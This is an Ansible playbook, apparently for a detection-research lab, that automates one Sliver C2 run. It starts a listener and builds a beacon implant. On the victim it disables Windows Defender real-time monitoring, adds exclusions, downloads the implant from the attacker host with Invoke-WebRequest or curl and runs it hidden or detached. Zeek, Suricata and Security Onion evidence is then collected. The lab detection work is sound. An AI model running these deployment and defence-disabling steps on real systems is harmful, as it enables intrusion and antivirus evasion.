@@ -1,0 +1,818 @@
+---
+# playbooks/sliver/run-single.yml — Complete single Sliver C2 experiment run
+#
+# Usage:
+#   ansible-playbook -i inventory.yml playbooks/sliver/run-single.yml \
+#     -e "run_id=SLV-HTTP-WIN-DEF-01 profile=http victim=windows"
+#
+# Required extra vars:
+#   run_id          — Experiment identifier, e.g. SLV-HTTP-WIN-DEF-01
+#
+# Optional extra vars (with defaults):
+#   profile         — http | https              (default: http)
+#   victim          — windows | linux           (default: windows)
+#   config_phase    — default | tuned           (default: default)
+#   beacon_duration — seconds to let beacon run (default: 1800)
+#   beacon_delay    — callback interval secs    (default: 60)
+#   beacon_jitter   — jitter seconds            (default: 6)
+#
+# Notes:
+#   - Sliver jitter is in seconds (not fraction like Empire)
+#   - Sliver generates compiled implants (~10 MB) not stager scripts
+#   - Automation via Sliver CLI, not REST API
+
+######################################################################
+# Play 1 — Setup & metadata
+######################################################################
+- name: "Setup — {{ run_id }}"
+  hosts: localhost
+  connection: local
+  gather_facts: no
+  vars:
+    _profile: "{{ profile | default('http') }}"
+    _victim: "{{ victim | default('windows') }}"
+    _duration: "{{ beacon_duration | default(1800) | int }}"
+    _delay: "{{ beacon_delay | default(60) | int }}"
+    _jitter: "{{ beacon_jitter | default(6) | int }}"
+    _config_phase: "{{ config_phase | default('default') }}"
+    _victim_ip: "{{ '172.16.20.10' if _victim == 'windows' else '172.16.20.11' }}"
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+  tasks:
+    - name: Remove stale run directory
+      file:
+        path: "{{ _run_dir }}"
+        state: absent
+
+    - name: Create run directory tree
+      file:
+        path: "{{ _run_dir }}/{{ item }}"
+        state: directory
+      loop: ["", pcap, zeek, suricata, seconion]
+
+    - name: Record start time
+      set_fact:
+        _run_start_time: "{{ lookup('pipe', 'date -Iseconds') }}"
+
+    - name: Write initial metadata
+      copy:
+        dest: "{{ _run_dir }}/metadata.json"
+        content: |
+          {
+            "run_id": "{{ run_id }}",
+            "framework": "sliver",
+            "profile": "{{ _profile }}",
+            "victim": "{{ _victim }}",
+            "victim_ip": "{{ _victim_ip }}",
+            "beacon_delay": {{ _delay }},
+            "beacon_jitter": {{ _jitter }},
+            "beacon_duration": {{ _duration }},
+            "config_phase": "{{ _config_phase }}",
+            "start_time": "{{ _run_start_time }}",
+            "status": "running"
+          }
+
+    - debug:
+        msg: >-
+          ▶ {{ run_id }}  profile={{ _profile }}  victim={{ _victim }}
+          config={{ _config_phase }}  duration={{ _duration }}s
+          delay={{ _delay }}s  jitter={{ _jitter }}s
+
+######################################################################
+# Play 2 — Rotate Zeek logs
+######################################################################
+- name: "Rotate Zeek logs"
+  hosts: sensor_zeek
+  become: yes
+  gather_facts: no
+  tasks:
+    - name: Restart Zeek for fresh logs
+      command: /opt/zeek/bin/zeekctl restart
+      changed_when: true
+
+    - name: Verify Zeek running
+      command: /opt/zeek/bin/zeekctl status
+      changed_when: false
+      register: zeek_status
+
+    - assert:
+        that: "'running' in zeek_status.stdout"
+        fail_msg: "Zeek failed to restart"
+
+    - name: Capture Zeek version
+      shell: /opt/zeek/bin/zeek --version 2>&1 | head -1
+      changed_when: false
+      register: _zeek_ver_raw
+
+    - set_fact:
+        _zeek_version: "{{ _zeek_ver_raw.stdout }}"
+
+    - name: Count loaded Zeek scripts
+      shell: grep -c '@load' /opt/zeek/share/zeek/site/local.zeek 2>/dev/null || echo 0
+      changed_when: false
+      register: _zeek_scripts_raw
+
+    - set_fact:
+        _zeek_script_count: "{{ _zeek_scripts_raw.stdout | int }}"
+
+######################################################################
+# Play 3 — Rotate Suricata logs
+######################################################################
+- name: "Rotate Suricata logs"
+  hosts: sensor_suricata
+  become: yes
+  gather_facts: no
+  tasks:
+    - name: Archive and remove old logs
+      shell: |
+        TS=$(date +%Y%m%d-%H%M%S)
+        mv /var/log/suricata/eve.json /var/log/suricata/eve-${TS}.json 2>/dev/null || true
+        mv /var/log/suricata/fast.log /var/log/suricata/fast-${TS}.log 2>/dev/null || true
+      args:
+        executable: /bin/bash
+
+    - name: Restart Suricata
+      systemd:
+        name: suricata
+        state: restarted
+
+    - name: Wait for Suricata to initialise
+      pause:
+        seconds: 10
+
+    - name: Verify Suricata active
+      command: systemctl is-active suricata
+      changed_when: false
+      register: suri_check
+
+    - assert:
+        that: "suri_check.stdout == 'active'"
+        fail_msg: "Suricata failed to restart"
+
+    - name: Capture Suricata version
+      shell: suricata -V 2>&1 | head -1
+      changed_when: false
+      register: _suri_ver_raw
+
+    - set_fact:
+        _suricata_version: "{{ _suri_ver_raw.stdout }}"
+
+    - name: Count Suricata rules
+      shell: grep -oP '\d+(?= signatures processed)' /var/log/suricata/suricata.log | tail -1 || echo 0
+      changed_when: false
+      register: _suri_rules_raw
+
+    - set_fact:
+        _suricata_rule_count: "{{ _suri_rules_raw.stdout | int }}"
+
+######################################################################
+# Play 4 — Sliver setup: server, listener, implant, capture
+######################################################################
+- name: "Sliver setup — {{ run_id }}"
+  hosts: attackers
+  become: yes
+  gather_facts: no
+  vars:
+    _profile: "{{ profile | default('http') }}"
+    _victim: "{{ victim | default('windows') }}"
+    _delay: "{{ beacon_delay | default(60) | int }}"
+    _jitter: "{{ beacon_jitter | default(6) | int }}"
+    _attacker_ip: "172.16.10.10"
+    _listener_port: "{{ 443 if _profile == 'https' else 8080 }}"
+    _implant_os: "{{ 'windows' if _victim == 'windows' else 'linux' }}"
+    _implant_ext: "{{ '.exe' if _victim == 'windows' else '' }}"
+    _implant_file: "{{ run_id }}{{ _implant_ext }}"
+    _implant_dir: "/home/labadmin/ise5901/sliver/implants"
+    _pcap_dir: "/home/labadmin/ise5901/sliver/pcaps"
+  tasks:
+    # ── Pre-clean ─────────────────────────────────────────────────
+    - name: Kill leftover Sliver server
+      shell: |
+        pgrep -f 'sliver-server' | grep -v "^$$\$" | xargs -r kill 2>/dev/null || true
+        fuser -k 8080/tcp 2>/dev/null || true
+        fuser -k 443/tcp 2>/dev/null || true
+        sleep 2
+      args:
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Kill leftover tcpdump
+      shell: |
+        pgrep -f tcpdump | grep -v "^$$\$" | xargs -r kill 2>/dev/null || true
+      args:
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Kill leftover HTTP payload server
+      shell: |
+        if [ -f /tmp/payload-server.pid ]; then
+          kill $(cat /tmp/payload-server.pid) 2>/dev/null || true
+          rm -f /tmp/payload-server.pid
+        fi
+        fuser -k 9999/tcp 2>/dev/null || true
+      args:
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Ensure directories exist
+      file:
+        path: "{{ item }}"
+        state: directory
+        owner: labadmin
+        mode: "0755"
+      loop:
+        - "{{ _implant_dir }}"
+        - "{{ _pcap_dir }}"
+
+    - name: Clean old implant file
+      file:
+        path: "{{ _implant_dir }}/{{ _implant_file }}"
+        state: absent
+
+    - name: Wait for listener port to free
+      shell: ss -tlnp | grep -q ':{{ _listener_port }} ' && echo busy || echo free
+      register: _listener_port_check
+      until: _listener_port_check.stdout == 'free'
+      retries: 24
+      delay: 5
+      changed_when: false
+
+    # ── Start Sliver server ───────────────────────────────────────
+    - name: Start Sliver server (daemon mode)
+      shell: |
+        nohup sliver-server daemon </dev/null >/dev/null 2>&1 &
+        echo $! > /tmp/sliver.pid
+      args:
+        executable: /bin/bash
+      changed_when: true
+
+    - name: Wait for Sliver server to initialise
+      pause:
+        seconds: 5
+
+    - name: Verify Sliver server is running
+      shell: sliver-client version 2>&1 | head -1
+      changed_when: false
+      register: _sliver_ver_raw
+      retries: 5
+      delay: 3
+      until: _sliver_ver_raw.rc == 0
+
+    - set_fact:
+        _sliver_version: "{{ _sliver_ver_raw.stdout }}"
+
+    # ── Ensure operator config exists for sliver-client ───────────
+    - name: Check for existing operator config
+      stat:
+        path: /root/.sliver-client/configs
+      register: sliver_client_cfg_dir
+
+    - name: Create operator config directory
+      file:
+        path: /root/.sliver-client/configs
+        state: directory
+        mode: "0700"
+      when: not sliver_client_cfg_dir.stat.exists
+
+    - name: Check for operator config file
+      find:
+        paths: /root/.sliver-client/configs
+        patterns: "*.cfg"
+      register: sliver_cfg_files
+
+    - name: Generate operator config
+      shell: >
+        sliver-server operator
+        --name labadmin
+        --lhost localhost
+        --permissions all
+        --save /root/.sliver-client/configs/labadmin.cfg
+        2>&1
+      when: sliver_cfg_files.matched == 0
+
+    # ── Kill existing jobs/beacons ────────────────────────────────
+    - name: Kill all existing beacons and jobs
+      shell: |
+        printf 'beacons --kill-all\njobs\nexit\n' > /tmp/sliver-cleanup.rc
+        timeout 30 sliver-client --rc /tmp/sliver-cleanup.rc 2>&1 || true
+      args:
+        executable: /bin/bash
+      changed_when: false
+
+    # ── Start listener ────────────────────────────────────────────
+    - name: Start listener via RC script
+      shell: |
+        printf '{{ _profile }} -L {{ _attacker_ip }} -l {{ _listener_port }}\njobs\nexit\n' > /tmp/sliver-listener.rc
+        timeout 30 sliver-client --rc /tmp/sliver-listener.rc 2>&1
+      args:
+        executable: /bin/bash
+      register: listener_result
+
+    - debug:
+        msg: "Listener started: {{ _profile }}://{{ _attacker_ip }}:{{ _listener_port }}"
+
+    # ── Generate implant ──────────────────────────────────────────
+    - name: Generate Sliver beacon implant via RC
+      shell: |
+        printf 'generate beacon -b {{ _profile }}://{{ _attacker_ip }}:{{ _listener_port }} -o {{ _implant_os }} -S {{ _delay }} -J {{ _jitter }} -l -s {{ _implant_dir }}/{{ _implant_file }}\nexit\n' > /tmp/sliver-generate.rc
+        timeout 600 sliver-client --rc /tmp/sliver-generate.rc 2>&1
+      args:
+        executable: /bin/bash
+      register: generate_result
+      # Implant compilation can take a while with obfuscation
+      async: 660
+      poll: 15
+
+    - debug:
+        msg: "Implant generated: {{ generate_result.stdout_lines | default(['done']) }}"
+
+    - name: Verify implant file exists
+      stat:
+        path: "{{ _implant_dir }}/{{ _implant_file }}"
+      register: implant_stat
+
+    - assert:
+        that: "implant_stat.stat.exists and implant_stat.stat.size > 0"
+        fail_msg: "Implant file is missing or empty"
+
+    # ── Start packet capture ──────────────────────────────────────
+    - name: Detect lab network interface
+      shell: ip -o addr show | grep '172.16.10.10' | awk '{print $2}'
+      changed_when: false
+      register: lab_iface
+
+    - assert:
+        that: "lab_iface.stdout | length > 0"
+        fail_msg: "Cannot find interface with 172.16.10.10"
+
+    - name: Start tcpdump
+      shell: |
+        nohup tcpdump -i {{ lab_iface.stdout }} \
+          -w {{ _pcap_dir }}/{{ run_id }}.pcap \
+          > /tmp/tcpdump-{{ run_id }}.log 2>&1 &
+        echo $! > /tmp/tcpdump-{{ run_id }}.pid
+      args:
+        executable: /bin/bash
+      changed_when: true
+
+    - name: Record capture start
+      shell: date -Iseconds
+      changed_when: false
+      register: capture_start
+
+    - set_fact:
+        _capture_start: "{{ capture_start.stdout }}"
+
+    # ── Serve implant via HTTP ────────────────────────────────────
+    - name: Start HTTP server for implant delivery
+      shell: |
+        cd {{ _implant_dir }}
+        nohup python3 -m http.server 9999 > /tmp/payload-server.log 2>&1 &
+        echo $! > /tmp/payload-server.pid
+      args:
+        executable: /bin/bash
+      changed_when: true
+
+    - name: Wait for HTTP server
+      wait_for:
+        host: 0.0.0.0
+        port: 9999
+        delay: 1
+        timeout: 10
+
+    - debug:
+        msg: >-
+          Sliver ready — {{ _profile }}://{{ _attacker_ip }}:{{ _listener_port }}
+          implant={{ _implant_file }}
+          pcap started at {{ _capture_start }}
+
+######################################################################
+# Play 5 — Deploy implant to Windows victim
+######################################################################
+- name: "Deploy implant — Windows"
+  hosts: victims_windows
+  gather_facts: no
+  vars:
+    _attacker_ip: "172.16.10.10"
+    _implant_file: "{{ run_id }}.exe"
+  tasks:
+    - block:
+        - name: Apply Defender exclusions
+          raw: >-
+            powershell.exe -NoProfile -Command
+            "Add-MpPreference
+            -ExclusionPath 'C:\temp'
+            -ExclusionProcess 'powershell.exe','cmd.exe','{{ run_id }}.exe';
+            Set-MpPreference -DisableRealtimeMonitoring $true;
+            Write-Output 'Defender exclusions applied'"
+          register: defender_result
+          ignore_errors: yes
+
+        - name: Download implant via HTTP
+          raw: >-
+            powershell.exe -NoProfile -Command
+            "$ProgressPreference='SilentlyContinue';
+            Remove-Item -Force -EA SilentlyContinue 'C:\temp\{{ _implant_file }}';
+            New-Item -ItemType Directory -Force -Path C:\temp | Out-Null;
+            Invoke-WebRequest
+            -Uri 'http://{{ _attacker_ip }}:9999/{{ _implant_file }}'
+            -OutFile 'C:\temp\{{ _implant_file }}';
+            Write-Output ('Downloaded: ' + (Get-Item 'C:\temp\{{ _implant_file }}').Length + ' bytes')"
+          register: download_result
+
+        - debug:
+            msg: "{{ download_result.stdout_lines | default(['download done']) }}"
+
+        - name: Execute implant (detached)
+          raw: >-
+            powershell.exe -Command
+            "Start-Process -FilePath 'C:\temp\{{ _implant_file }}'
+            -WindowStyle Hidden;
+            Write-Output 'Implant launched'"
+          register: deploy_result
+
+        - debug:
+            msg: "Windows deploy: {{ deploy_result.stdout_lines | default(['done']) }}"
+      when: (victim | default('windows')) == 'windows'
+
+######################################################################
+# Play 6 — Deploy implant to Linux victim
+######################################################################
+- name: "Deploy implant — Linux"
+  hosts: victims_linux
+  gather_facts: no
+  vars:
+    _attacker_ip: "172.16.10.10"
+    _implant_file: "{{ run_id }}"
+  tasks:
+    - block:
+        - name: Download and execute implant
+          shell: |
+            curl -s -o /tmp/{{ _implant_file }} http://{{ _attacker_ip }}:9999/{{ _implant_file }}
+            chmod +x /tmp/{{ _implant_file }}
+            nohup /tmp/{{ _implant_file }} > /dev/null 2>&1 &
+            disown
+            echo "Implant deployed"
+          args:
+            executable: /bin/bash
+          register: deploy_result
+
+        - debug:
+            msg: "Linux deploy: {{ deploy_result.stdout_lines | default(['done']) }}"
+      when: (victim | default('windows')) == 'linux'
+
+######################################################################
+# Play 7 — Wait for beacon check-in
+######################################################################
+- name: "Wait for beacon — {{ run_id }}"
+  hosts: attackers
+  become: yes
+  gather_facts: no
+  tasks:
+    - name: Poll for beacon check-in
+      shell: |
+        printf 'beacons\nexit\n' > /tmp/sliver-beacons.rc
+        timeout 20 sliver-client --rc /tmp/sliver-beacons.rc 2>&1 | grep -cP '^\s+[0-9a-f]{6,}' || echo 0
+      args:
+        executable: /bin/bash
+      register: beacon_count
+      until: (beacon_count.stdout_lines | last | int) > 0
+      retries: 30
+      delay: 10
+
+    - name: Capture beacon details
+      shell: |
+        printf 'beacons\nexit\n' > /tmp/sliver-beacons.rc
+        timeout 20 sliver-client --rc /tmp/sliver-beacons.rc 2>&1
+      changed_when: false
+      register: beacon_info
+
+    - debug:
+        msg: "Beacon checked in: {{ beacon_info.stdout_lines | default(['unknown']) | first }}"
+
+######################################################################
+# Play 8 — Beacon duration wait
+######################################################################
+- name: "Beacon wait — {{ beacon_duration | default(1800) }}s"
+  hosts: localhost
+  connection: local
+  gather_facts: no
+  tasks:
+    - name: "Wait for beacon traffic ({{ beacon_duration | default(1800) }}s)"
+      pause:
+        seconds: "{{ beacon_duration | default(1800) | int }}"
+
+######################################################################
+# Play 9 — Teardown (kill beacons, stop processes)
+######################################################################
+- name: "Teardown — {{ run_id }}"
+  hosts: attackers
+  become: yes
+  gather_facts: no
+  tasks:
+    - name: Kill all beacons
+      shell: |
+        printf 'beacons --kill-all\nexit\n' > /tmp/sliver-kill.rc
+        timeout 20 sliver-client --rc /tmp/sliver-kill.rc 2>&1 || true
+      args:
+        executable: /bin/bash
+
+    - name: Kill all Sliver jobs (listeners)
+      shell: |
+        # Get job IDs and kill each one
+        printf 'jobs\nexit\n' > /tmp/sliver-jobs.rc
+        for jid in $(timeout 15 sliver-client --rc /tmp/sliver-jobs.rc 2>&1 | grep -oP '^\s*\K\d+' || true); do
+          printf "jobs -k $jid\nexit\n" > /tmp/sliver-killjob.rc
+          timeout 15 sliver-client --rc /tmp/sliver-killjob.rc 2>&1 || true
+        done
+      args:
+        executable: /bin/bash
+
+    - name: Stop tcpdump
+      shell: |
+        if [ -f /tmp/tcpdump-{{ run_id }}.pid ]; then
+          kill $(cat /tmp/tcpdump-{{ run_id }}.pid) 2>/dev/null || true
+          rm -f /tmp/tcpdump-{{ run_id }}.pid
+        fi
+      args:
+        executable: /bin/bash
+
+    - name: Stop HTTP server
+      shell: |
+        if [ -f /tmp/payload-server.pid ]; then
+          kill $(cat /tmp/payload-server.pid) 2>/dev/null || true
+          rm -f /tmp/payload-server.pid
+        fi
+      args:
+        executable: /bin/bash
+
+    - name: Stop Sliver server
+      shell: |
+        if [ -f /tmp/sliver.pid ]; then
+          kill $(cat /tmp/sliver.pid) 2>/dev/null || true
+          rm -f /tmp/sliver.pid
+        fi
+        pgrep -f 'sliver-server' | grep -v "^$$\$" | xargs -r kill 2>/dev/null || true
+      args:
+        executable: /bin/bash
+
+    - name: Record capture end
+      shell: date -Iseconds
+      changed_when: false
+      register: capture_end
+
+    - debug:
+        msg: "Teardown complete — capture ended {{ capture_end.stdout }}"
+
+######################################################################
+# Play 9b — Clean victim & re-enable defences
+######################################################################
+- name: "Victim cleanup — Windows"
+  hosts: victims_windows
+  gather_facts: no
+  tasks:
+    - block:
+        - name: Kill implant process
+          raw: >-
+            powershell.exe -Command
+            "Get-Process -Name '{{ run_id }}' -ErrorAction SilentlyContinue |
+            Stop-Process -Force -ErrorAction SilentlyContinue;
+            Write-Output 'Cleaned'"
+          ignore_errors: yes
+
+        - name: Remove implant file
+          raw: >-
+            powershell.exe -Command
+            "Remove-Item -Force -EA SilentlyContinue 'C:\temp\{{ run_id }}*';
+            Write-Output 'Removed'"
+          ignore_errors: yes
+
+        - name: Re-enable Defender real-time monitoring
+          raw: >-
+            powershell.exe -Command
+            "Remove-MpPreference -ExclusionPath 'C:\temp' -ErrorAction SilentlyContinue;
+            Set-MpPreference -DisableRealtimeMonitoring $false;
+            Write-Output 'Defender RT re-enabled'"
+          ignore_errors: yes
+      when: (victim | default('windows')) == 'windows'
+
+- name: "Victim cleanup — Linux"
+  hosts: victims_linux
+  gather_facts: no
+  tasks:
+    - block:
+        - name: Kill implant process
+          shell: |
+            pgrep -f '{{ run_id }}' | grep -v "^$$\$" | xargs -r kill 2>/dev/null || true
+            rm -f /tmp/{{ run_id }}*
+            echo "Cleaned"
+          args:
+            executable: /bin/bash
+      when: (victim | default('windows')) == 'linux'
+
+######################################################################
+# Play 10 — Collect Zeek logs
+######################################################################
+- name: "Collect Zeek — {{ run_id }}"
+  hosts: sensor_zeek
+  become: yes
+  gather_facts: no
+  vars:
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+  tasks:
+    - name: Archive Zeek current logs
+      archive:
+        path: /opt/zeek/logs/current/
+        dest: /tmp/zeek-{{ run_id }}.tar.gz
+        format: gz
+
+    - name: Fetch Zeek archive
+      fetch:
+        src: /tmp/zeek-{{ run_id }}.tar.gz
+        dest: "{{ _run_dir }}/zeek/"
+        flat: yes
+
+    - name: Clean remote archive
+      file:
+        path: /tmp/zeek-{{ run_id }}.tar.gz
+        state: absent
+
+######################################################################
+# Play 11 — Collect Suricata logs
+######################################################################
+- name: "Collect Suricata — {{ run_id }}"
+  hosts: sensor_suricata
+  become: yes
+  gather_facts: no
+  vars:
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+  tasks:
+    - name: Fetch eve.json
+      fetch:
+        src: /var/log/suricata/eve.json
+        dest: "{{ _run_dir }}/suricata/eve-{{ run_id }}.json"
+        flat: yes
+      ignore_errors: yes
+
+    - name: Fetch fast.log
+      fetch:
+        src: /var/log/suricata/fast.log
+        dest: "{{ _run_dir }}/suricata/fast-{{ run_id }}.log"
+        flat: yes
+      ignore_errors: yes
+
+######################################################################
+# Play 12 — Collect Security Onion
+######################################################################
+- name: "Collect SO — {{ run_id }}"
+  hosts: sensor_seconion
+  become: yes
+  gather_facts: no
+  vars:
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+    _start_time: "{{ hostvars['localhost']._run_start_time }}"
+    _end_time: "{{ lookup('pipe', 'date -Iseconds') }}"
+  tasks:
+    - name: Capture SO version
+      shell: cat /etc/soversion 2>/dev/null || echo "unknown"
+      changed_when: false
+      register: _so_ver_raw
+
+    - set_fact:
+        _so_version: "{{ _so_ver_raw.stdout }}"
+
+    - name: Export SO Suricata alerts
+      shell: |
+        so-elasticsearch-query '.ds-logs-suricata.alerts-so-*/_search' \
+          -d '{"query":{"range":{"@timestamp":{"gte":"{{ _start_time }}","lte":"{{ _end_time }}"}}},"size":10000}' \
+          > /tmp/so-suricata-{{ run_id }}.json 2>/dev/null || true
+      changed_when: false
+
+    - name: Export SO Zeek logs
+      shell: |
+        so-elasticsearch-query '.ds-logs-zeek-so-*/_search' \
+          -d '{"query":{"range":{"@timestamp":{"gte":"{{ _start_time }}","lte":"{{ _end_time }}"}}},"size":10000}' \
+          > /tmp/so-zeek-{{ run_id }}.json 2>/dev/null || true
+      changed_when: false
+
+    - name: Fetch SO Suricata alerts
+      fetch:
+        src: /tmp/so-suricata-{{ run_id }}.json
+        dest: "{{ _run_dir }}/seconion/so-suricata-{{ run_id }}.json"
+        flat: yes
+      ignore_errors: yes
+
+    - name: Fetch SO Zeek logs
+      fetch:
+        src: /tmp/so-zeek-{{ run_id }}.json
+        dest: "{{ _run_dir }}/seconion/so-zeek-{{ run_id }}.json"
+        flat: yes
+      ignore_errors: yes
+
+    - name: Clean remote files
+      file:
+        path: "/tmp/{{ item }}"
+        state: absent
+      loop:
+        - "so-suricata-{{ run_id }}.json"
+        - "so-zeek-{{ run_id }}.json"
+      ignore_errors: yes
+
+######################################################################
+# Play 13 — Collect pcap from attacker
+######################################################################
+- name: "Collect pcap — {{ run_id }}"
+  hosts: attackers
+  become: yes
+  gather_facts: no
+  vars:
+    _pcap_dir: "/home/labadmin/ise5901/sliver/pcaps"
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+  tasks:
+    - name: Fetch pcap
+      fetch:
+        src: "{{ _pcap_dir }}/{{ run_id }}.pcap"
+        dest: "{{ _run_dir }}/pcap/"
+        flat: yes
+      ignore_errors: yes
+
+######################################################################
+# Play 14 — Finalize metadata and manifest
+######################################################################
+- name: "Finalize — {{ run_id }}"
+  hosts: localhost
+  connection: local
+  gather_facts: no
+  vars:
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+    _profile: "{{ profile | default('http') }}"
+    _victim: "{{ victim | default('windows') }}"
+    _duration: "{{ beacon_duration | default(1800) | int }}"
+    _delay: "{{ beacon_delay | default(60) | int }}"
+    _jitter: "{{ beacon_jitter | default(6) | int }}"
+    _victim_ip: "{{ '172.16.20.10' if _victim == 'windows' else '172.16.20.11' }}"
+  tasks:
+    - name: Read start time from metadata
+      slurp:
+        src: "{{ _run_dir }}/metadata.json"
+      register: _meta_raw
+
+    - name: Update metadata with end time
+      copy:
+        dest: "{{ _run_dir }}/metadata.json"
+        content: |
+          {
+            "run_id": "{{ run_id }}",
+            "framework": "sliver",
+            "profile": "{{ _profile }}",
+            "victim": "{{ _victim }}",
+            "victim_ip": "{{ _victim_ip }}",
+            "config_phase": "{{ config_phase | default('default') }}",
+            "beacon_delay": {{ _delay }},
+            "beacon_jitter": {{ _jitter }},
+            "beacon_duration": {{ _duration }},
+            "start_time": "{{ (_meta_raw.content | b64decode | from_json).start_time }}",
+            "end_time": "{{ lookup('pipe', 'date -Iseconds') }}",
+            "status": "complete",
+            "sensor_versions": {
+              "zeek": "{{ hostvars['mon-zeek-01']._zeek_version | default('unknown') }}",
+              "zeek_script_count": {{ hostvars['mon-zeek-01']._zeek_script_count | default(0) }},
+              "suricata": "{{ hostvars['mon-suricata-01']._suricata_version | default('unknown') }}",
+              "suricata_rule_count": {{ hostvars['mon-suricata-01']._suricata_rule_count | default(0) }},
+              "security_onion": "{{ hostvars['mon-seconion-01']._so_version | default('unknown') }}",
+              "sliver": "{{ hostvars['atk-kali-01']._sliver_version | default('unknown') }}"
+            }
+          }
+
+    - name: List collected artifacts
+      find:
+        paths: "{{ _run_dir }}"
+        recurse: yes
+      register: collected_files
+
+    - name: Generate artifact checksums
+      shell: |
+        cd {{ _run_dir }}
+        find . -type f ! -name manifest.txt -exec sha256sum {} \;
+      register: checksums
+
+    - name: Write manifest
+      copy:
+        dest: "{{ _run_dir }}/manifest.txt"
+        content: |
+          Run ID: {{ run_id }}
+          Profile: {{ _profile }}
+          Victim: {{ _victim }}
+          Config: {{ config_phase | default('default') }}
+          Completed: {{ lookup('pipe', 'date -Iseconds') }}
+          Files: {{ collected_files.matched }}
+          {% for f in collected_files.files %}
+          - {{ f.path | replace(_run_dir + '/', '') }} ({{ f.size }} bytes)
+          {% endfor %}
+
+          SHA-256 Checksums:
+          {{ checksums.stdout }}
+
+    - debug:
+        msg: >-
+          ✓ {{ run_id }} complete — {{ collected_files.matched }} artifacts
+          in runs/{{ run_id }}/
